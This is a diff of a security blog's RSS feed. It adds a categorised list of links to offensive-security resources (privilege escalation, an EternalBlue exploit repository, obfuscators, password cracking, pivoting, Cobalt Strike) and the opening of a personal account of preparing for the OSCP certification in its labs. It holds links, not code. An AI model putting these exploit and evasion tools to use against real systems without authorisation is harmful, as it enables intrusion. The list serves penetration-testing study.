@@ -1,4 +1,577 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>blog on Ceso Adventures</title><link>https://ceso.github.io/tags/blog/</link><description>Recent content in blog on Ceso Adventures</description><generator>Hugo -- gohugo.io</generator><lastBuildDate>Fri, 04 Dec 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://ceso.github.io/tags/blog/index.xml" rel="self" type="application/rss+xml"/><item><title>Hacking Resources</title><link>https://ceso.github.io/posts/2020/12/hacking-resources/</link><pubDate>Fri, 04 Dec 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/12/hacking-resources/</guid><description>Usefull Web Browser plugins https://www.wappalyzer.com/download/ https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ &amp;lt;&amp;mdash;&amp;mdash; For Firefox https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp &amp;lt;&amp;mdash;&amp;mdash; For Chrome https://cookie-editor.cgagnier.ca/#download https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/ Cool Tools/Labs https://www.blacklanternsecurity.com/2020-12-02-WriteHat/ https://github.com/madhuakula/kubernetes-goat https://github.com/m8r0wn/ActiveReign https://github.com/sundowndev/PhoneInfoga https://github.com/GoSecure/dtd-finder https://www.shodan.io/ https://crt.sh https://dnsdumpster.com/ https://mxtoolbox.com/ Linux Privilege Escalation https://gtfobins.github.io/ https://book.hacktricks.xyz/linux-unix/privilege-escalation https://guif.re/linuxeop https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://www.win.tue.nl/~aeb/linux/hh/hh-8.html http://www.dankalia.com/tutor/01005/0100501004.htm Windows Privilege Escalation https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ http://www.fuzzysecurity.com/tutorials/16.html https://github.com/J3rryBl4nks/LPEWalkthrough/blob/master/Walkthrough.md https://github.com/worawit/MS17-010 &amp;lt;&amp;mdash;&amp;mdash; Eternal blue without MSF https://github.com/ankh2054/windows-pentest https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html https://github.com/frizb/Windows-Privilege-Escalation Windows stuff http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf https://www.lemoda.net/windows/windows2unix/windows2unix.html https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/ https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html https://malicious.link/post/2016/kerberoast-pt1/ Exploit Development/Reversing https://www.</description></item><item><title>A Journey in the Dark - An adventure's tale towards OSCP</title><link>https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/</link><pubDate>Mon, 27 Apr 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/</guid><description>Preface This is the story of how I got my OSCP coming from a background as Linux Sysadmin/DevOps as also which ones are my plans for the future.
-Every tale where there is an adventurer, starts with him (the adventurer) and his friends, these who share the journey providing support and advice through it, as the story moves forward, new characters tend to appear, joining the adventurer in his travel.</description></item><item><title>Hacking/OSCP cheatsheet</title><link>https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/</link><pubDate>Tue, 07 Apr 2020 02:30:30 +0000</pubDate><guid>https://ceso.github.io/posts/2020/04/hacking/oscp-cheatsheet/</guid><description>Hacking/OSCP Cheatsheet Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff. But this is basically the tools I tend to relie and use in this way the most. Hope is helpfull for you!
-Enumeration Network discoverie Nmap I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:</description></item><item><title>shutdown -r now</title><link>https://ceso.github.io/posts/2019/12/shutdown-r-now/</link><pubDate>Sun, 22 Dec 2019 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2019/12/shutdown-r-now/</guid><description>Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.
-I have always been thinking about writing a blog, but my mindset has always been the same &amp;ldquo;me? a blog? what am I supposed to post! I can&amp;rsquo;t even think anything I could share with people, I don&amp;rsquo;t know nothing compared to the people who blogs!&amp;rdquo;, currently that mindset has been changing.</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>blog on Ceso Adventures</title><link>https://ceso.github.io/tags/blog/</link><description>Recent content in blog on Ceso Adventures</description><generator>Hugo -- gohugo.io</generator><lastBuildDate>Fri, 04 Dec 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://ceso.github.io/tags/blog/index.xml" rel="self" type="application/rss+xml"/><item><title>Hacking Resources</title><link>https://ceso.github.io/posts/2020/12/hacking-resources/</link><pubDate>Fri, 04 Dec 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/12/hacking-resources/</guid><description>&lt;h4 id="usefull-web-browser-plugins">Usefull Web Browser plugins&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://www.wappalyzer.com/download/">https://www.wappalyzer.com/download/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/&lt;/a> &lt;strong>&amp;lt;&amp;mdash;&amp;mdash; For Firefox&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp">https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp&lt;/a> &lt;strong>&amp;lt;&amp;mdash;&amp;mdash; For Chrome&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://cookie-editor.cgagnier.ca/#download">https://cookie-editor.cgagnier.ca/#download&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/">https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="cool-toolslabs">Cool Tools/Labs&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://www.blacklanternsecurity.com/2020-12-02-WriteHat/">https://www.blacklanternsecurity.com/2020-12-02-WriteHat/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/madhuakula/kubernetes-goat">https://github.com/madhuakula/kubernetes-goat&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/m8r0wn/ActiveReign">https://github.com/m8r0wn/ActiveReign&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/sundowndev/PhoneInfoga">https://github.com/sundowndev/PhoneInfoga&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/GoSecure/dtd-finder">https://github.com/GoSecure/dtd-finder&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.shodan.io/">https://www.shodan.io/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://crt.sh">https://crt.sh&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://dnsdumpster.com/">https://dnsdumpster.com/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://mxtoolbox.com/">https://mxtoolbox.com/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="linux-privilege-escalation">Linux Privilege Escalation&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://gtfobins.github.io/">https://gtfobins.github.io/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://guif.re/linuxeop">https://guif.re/linuxeop&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.win.tue.nl/~aeb/linux/hh/hh-8.html">https://www.win.tue.nl/~aeb/linux/hh/hh-8.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://www.dankalia.com/tutor/01005/0100501004.htm">http://www.dankalia.com/tutor/01005/0100501004.htm&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="windows-privilege-escalation">Windows Privilege Escalation&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/J3rryBl4nks/LPEWalkthrough/blob/master/Walkthrough.md">https://github.com/J3rryBl4nks/LPEWalkthrough/blob/master/Walkthrough.md&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/worawit/MS17-010">https://github.com/worawit/MS17-010&lt;/a> &lt;strong>&amp;lt;&amp;mdash;&amp;mdash; Eternal blue without MSF&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://github.com/ankh2054/windows-pentest">https://github.com/ankh2054/windows-pentest&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html">https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/frizb/Windows-Privilege-Escalation">https://github.com/frizb/Windows-Privilege-Escalation&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="windows-stuff">Windows stuff&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf">http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.lemoda.net/windows/windows2unix/windows2unix.html">https://www.lemoda.net/windows/windows2unix/windows2unix.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html">https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/">https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html">https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://malicious.link/post/2016/kerberoast-pt1/">https://malicious.link/post/2016/kerberoast-pt1/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="exploit-developmentreversing">Exploit Development/Reversing&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html">https://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://n4r1b.netlify.app/posts/2020/01/dissecting-the-windows-defender-driver-wdfilter-part-1/">https://n4r1b.netlify.app/posts/2020/01/dissecting-the-windows-defender-driver-wdfilter-part-1/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing">https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="active-directory">Active Directory&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://malicious.link/post/2016/kerberoast-pt1/">https://malicious.link/post/2016/kerberoast-pt1/&lt;/a> &lt;strong>&amp;lt;&amp;mdash;&amp;mdash; Serie about Kerberoasting (5 pts)&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="linux-stuff">Linux stuff&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="http://www.pathname.com/fhs/pub/fhs-2.3.html">http://www.pathname.com/fhs/pub/fhs-2.3.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/rapid7/ssh-badkeys">https://github.com/rapid7/ssh-badkeys&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://www.linusakesson.net/programming/tty/">http://www.linusakesson.net/programming/tty/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">http://pentestmonkey.net/blog/post-exploitation-without-a-tty&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="pivoting">Pivoting&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://artkond.com/2017/03/23/pivoting-guide/">https://artkond.com/2017/03/23/pivoting-guide/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://nullsweep.com/pivot-cheatsheet-for-pentesters/">https://nullsweep.com/pivot-cheatsheet-for-pentesters/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html">https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="brute-forcecracking">Brute force/Cracking&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/Coalfire-Research/npk">https://github.com/Coalfire-Research/npk&lt;/a> &lt;strong>&amp;lt;&amp;mdash;&amp;mdash; Distributed hash-cracking platform on serverless AWS componentes&lt;/strong>&lt;/li>
+&lt;li>&lt;a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/rapid7/ssh-badkeys">https://github.com/rapid7/ssh-badkeys&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://crackstation.net/">https://crackstation.net/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="compiling-exploits">Compiling exploits&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://stackoverflow.com/questions/4032373/linking-against-an-old-version-of-libc-to-provide-greater-application-coverage">https://stackoverflow.com/questions/4032373/linking-against-an-old-version-of-libc-to-provide-greater-application-coverage&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.lordaro.co.uk/posts/2018-08-26-compiling-glibc.html">https://www.lordaro.co.uk/posts/2018-08-26-compiling-glibc.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/">https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="obfuscators">Obfuscators&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/Bashfuscator/Bashfuscator">https://github.com/Bashfuscator/Bashfuscator&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="deobfuscators">Deobfuscators&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://www.unphp.net/">https://www.unphp.net/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://lelinhtinh.github.io/de4js/">https://lelinhtinh.github.io/de4js/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://jsnice.org/">http://jsnice.org/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/java-deobfuscator/deobfuscator">https://github.com/java-deobfuscator/deobfuscator&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="buffer-overflows">Buffer Overflows&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/justinsteven/dostackbufferoverflowgood">https://github.com/justinsteven/dostackbufferoverflowgood&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/stephenbradshaw/vulnserver">https://github.com/stephenbradshaw/vulnserver&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.vulnhub.com/entry/brainpan-1,51/">https://www.vulnhub.com/entry/brainpan-1,51/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://exploit.education/phoenix/">https://exploit.education/phoenix/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.youtube.com/watch?v=1S0aBV-Waeo">https://www.youtube.com/watch?v=1S0aBV-Waeo&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="general-hacking-cheatsheetscool-articlespodcasts">General Hacking Cheatsheets/Cool Articles/Podcasts&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md">https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/Optixal/OSCP-PWK-Notes-Public">https://github.com/Optixal/OSCP-PWK-Notes-Public&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/OlivierLaflamme/Cheatsheet-God">https://github.com/OlivierLaflamme/Cheatsheet-God&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/sinfulz/JustTryHarder/">https://github.com/sinfulz/JustTryHarder/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/0x4D31/awesome-oscp">https://github.com/0x4D31/awesome-oscp&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/xapax/security">https://github.com/xapax/security&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://book.hacktricks.xyz/">https://book.hacktricks.xyz/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html">https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html">https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/Hack-with-Github/Awesome-Hacking">https://github.com/Hack-with-Github/Awesome-Hacking&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://jhalon.github.io/becoming-a-pentester/">https://jhalon.github.io/becoming-a-pentester/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.inteltechniques.com/podcast.html">https://www.inteltechniques.com/podcast.html&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://darknetdiaries.com/">https://darknetdiaries.com/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="cobalt-strike">Cobalt Strike&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet">https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="bug-bountyweb-security">Bug Bounty/Web Security&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/OWASP/wstg">https://github.com/OWASP/wstg&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/">https://github.com/swisskyrepo/PayloadsAllTheThings/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://tomnomnom.com/talks/bug-bounties-with-bash-virsec.pdf">https://tomnomnom.com/talks/bug-bounties-with-bash-virsec.pdf&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://docs.google.com/presentation/d/1DAQ47VjIaQZ88Ly00eGPQupq79hAF9AAZstV7OVCY_8">https://docs.google.com/presentation/d/1DAQ47VjIaQZ88Ly00eGPQupq79hAF9AAZstV7OVCY_8&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/ngalongc/bug-bounty-reference">https://github.com/ngalongc/bug-bounty-reference&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://gowsundar.gitbook.io/book-of-bugbounty-tips">https://gowsundar.gitbook.io/book-of-bugbounty-tips&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/jdonsec/AllThingsSSRF">https://github.com/jdonsec/AllThingsSSRF&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/jdonsec/AllThingsXXE">https://github.com/jdonsec/AllThingsXXE&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://xsleaks.com/">https://xsleaks.com/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.reddit.com/r/bugbounty/comments/983odf/how_to_become_a_bug_bounty_hunter/">https://www.reddit.com/r/bugbounty/comments/983odf/how_to_become_a_bug_bounty_hunter/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="red-team-resources">Red Team Resources&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki&lt;/a>&lt;/li>
+&lt;li>&lt;/li>
+&lt;/ul>
+&lt;h4 id="cool-presentationsvideos">Cool presentations/videos&lt;/h4>
+&lt;ul>
+&lt;li>A New Era Of SSRF: Exploiting Url Parsrs - Orange Tsai &lt;a href="https://www.youtube.com/watch?v=D1S-G8rJrEk">https://www.youtube.com/watch?v=D1S-G8rJrEk&lt;/a>&lt;/li>
+&lt;li>HTTP Desync Attacks: Smashing into the Cell Next Door - albinowax &lt;a href="https://www.youtube.com/watch?v=w-eJM2Pc0KI&amp;amp;t=1622s">https://www.youtube.com/watch?v=w-eJM2Pc0KI&amp;amp;t=1622s&lt;/a>&lt;/li>
+&lt;li>A $7.500 BUG BOUNTY Bug Explained, step by step. (Blind XXE OOB over DNS) - STOK &lt;a href="https://www.youtube.com/watch?v=aSiIHKeN3ys&amp;amp;t=26s&amp;amp;pbjreload=101">https://www.youtube.com/watch?v=aSiIHKeN3ys&amp;amp;t=26s&amp;amp;pbjreload=101&lt;/a>&lt;/li>
+&lt;li>GitHub Recon and Sensitive Data Exposure &lt;a href="https://youtu.be/l0YsEk_59fQ">https://youtu.be/l0YsEk_59fQ&lt;/a>&lt;/li>
+&lt;li>Cracking the Lens: Targeting HTTP&amp;rsquo;s Hidden Attack-Surface &lt;a href="https://www.youtube.com/watch?v=zP4b3pw94s0">https://www.youtube.com/watch?v=zP4b3pw94s0&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h4 id="cool-books">Cool Books&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470">https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.amazon.com/Real-World-Bug-Hunting-Field-Hacking/dp/1593278616/">https://www.amazon.com/Real-World-Bug-Hunting-Field-Hacking/dp/1593278616/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.amazon.com/How-Linux-Works-2nd-Superuser/dp/1593275676/">https://www.amazon.com/How-Linux-Works-2nd-Superuser/dp/1593275676/&lt;/a>&lt;/li>
+&lt;/ul></description></item><item><title>A Journey in the Dark - An adventure's tale towards OSCP</title><link>https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/</link><pubDate>Mon, 27 Apr 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/</guid><description>
+&lt;img src="https://ceso.github.io/images/blog/oscp/oscp_banner.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="preface">Preface&lt;/h2>
+&lt;p>This is the story of how I got my OSCP coming from a background as Linux Sysadmin/DevOps as also which ones are my plans for the future.&lt;/p>
+&lt;p>Every tale where there is an adventurer, starts with him (the adventurer) and his friends, these who share the journey providing support and advice through it, as the story moves forward, new characters tend to appear, joining the adventurer in his travel.&lt;/p>
+&lt;p>This story is no less , then before than anything thanks to my buddies &lt;a href="https://www.hackthebox.eu/home/users/profile/186934">r0xas&lt;/a>, &lt;a href="https://www.hackthebox.eu/home/users/profile/12286">MrBulldops&lt;/a>, &lt;a href="https://twitter.com/tagnullde">0x41&lt;/a> and &lt;a href="https://www.hackthebox.eu/home/users/profile/43855">DutchPyro&lt;/a>, for helping and still help me in this adventures and the ones that will came.
+And most than anything &lt;a href="https://www.linkedin.com/in/mquerves/">Mauri&lt;/a> because you just convinced to stop shitting myself, from &amp;ldquo;I can&amp;rsquo;t&amp;rdquo; to &amp;ldquo;I can&amp;rdquo;.&lt;/p>
+&lt;p>&lt;em>By the way, I really really love books (guess why the title of the post!), and I&amp;rsquo;m really happy getting this cert during this C-19 thing (living abroad at this time, is though), so I just wanted to make this post in the way it makes me the happiest.&lt;/em>&lt;/p>
+&lt;h2 id="000-the-background">000: The background&lt;/h2>
+&lt;p>At the ends of 2014 I started my first IT job, specifically as a Linux Sysadmin Junior, almost knowing nothing more than a few really basic concepts, in this place I got to learn a lot of stuff and was where I got to know awesome technicians and people, at this day all of them friends, and ones I consider the closest for me.
+From this forward, I kept advancing some seniorities and changed 2 times of job and moving abroad last year, currently working as a DevOps Engineer (tl;dr, it&amp;rsquo;s been 5 years and going to 6), all the time learning new stuff, either at work or by myself, but never without stop learning.&lt;/p>
+&lt;p>I don&amp;rsquo;t hold any kind of degree most than High School. I started university but I moved abroad so, something I will neither earn in the future, all what I know, is by self-teaching. I&amp;rsquo;m someone who loves to be ALL the time learning new stuff, to understand how stuff works, trying to replicate it, break it, play with it and see what happens, always enjoying the process of learning, either if there is no light and all is an &amp;ldquo;I&amp;rsquo;m stupid/I suck/I can&amp;rsquo;t&amp;rdquo; or that amazing moment when something clicks in and you turn into the most happiest person just because you learned something new regardless if it was something stupid or not.&lt;/p>
+&lt;h2 id="001-my-preparation">001: My preparation&lt;/h2>
+&lt;p>I always felt attracted to security but never felt confident to actually start learning about it, until November of last year that Mauri just made me make my mind. From this I started playing a bit in Hack The Box, all the time using hints, watching &lt;a href="https://ippsec.rocks/">Ippsec videos&lt;/a> or learning new stuff by reading machine write-ups by &lt;a href="0xrick.github.io/">0xrick&lt;/a> and by &lt;a href="0xdf.gitlab.io/">0xdf&lt;/a>.
+I did (in this order): Postman, Traverxec, Lame, Bitlab, Bashed, Obscurity, Mango, AI and Craft (first one without hints), tried to do OpenAdmin but was unable to get the second user without hints, I decided I did not want to read more hints, so just put it for later (after PWK was pretty easy :D).&lt;/p>
+&lt;p>I got 90 days and my lab time started the 5th of January, my way of approaching it was:&lt;/p>
+&lt;ul>
+&lt;li>I spent the first 2 weeks just going through the PDF and the Videos.&lt;/li>
+&lt;li>Once I was done with this I started to the labs, but a few days after some personal problems arose and I was so stressed that I couldn&amp;rsquo;t focus at nothing, so for around 1 - 2 weeks I stopped touching the labs (that I barely touched) or anything OSCP related.&lt;/li>
+&lt;li>Storm ended, I started to play a bit everyday after work on the labs, this was around 1 - 2 hs per day, and on weekends tried to sessions of 8 - 12 hours.&lt;/li>
+&lt;li>OSCP announced their upgrade to the new labs, being I still had time left (even going through some shit), and keeping in mind the amount of new material (from 300-ish pages on the PDF to 800-ish, and from 7-ish hs of videos to 18-ish hs of videos) I just decided it was worth to do the upgrade, so I did it.&lt;/li>
+&lt;li>I got the new material and VPN, and started to play in the new labs, but at this time using the material more as reference on certain specific topics (example: Microsoft Office explotaition), this still being complemented with Ippsec + 0xrick and 0xdf write-ups.&lt;/li>
+&lt;/ul>
+&lt;h2 id="010-my-lab-experience">010: My lab experience&lt;/h2>
+&lt;p>As mentioned, of the 90 days I used way less than those for doing the labs, now before starting to play with them, I set some goals that I needed to achieve before the lab time ended, these goals were:&lt;/p>
+&lt;ul>
+&lt;li>Compromise in total at least 42 machines.&lt;/li>
+&lt;li>Gain access to all the extra nets.&lt;/li>
+&lt;li>Root on no less than 3 hosts per extra net.&lt;/li>
+&lt;li>Completly root an extra net.&lt;/li>
+&lt;/ul>
+&lt;p>I achieved all those goals, of the 42 machines I got 46 (of a total 75), got access to the 3 extra nets, compromised more than 3 hosts per net and fully rooted one; Dev 5 hosts, IT 4 hosts and Admin fully rooted.&lt;/p>
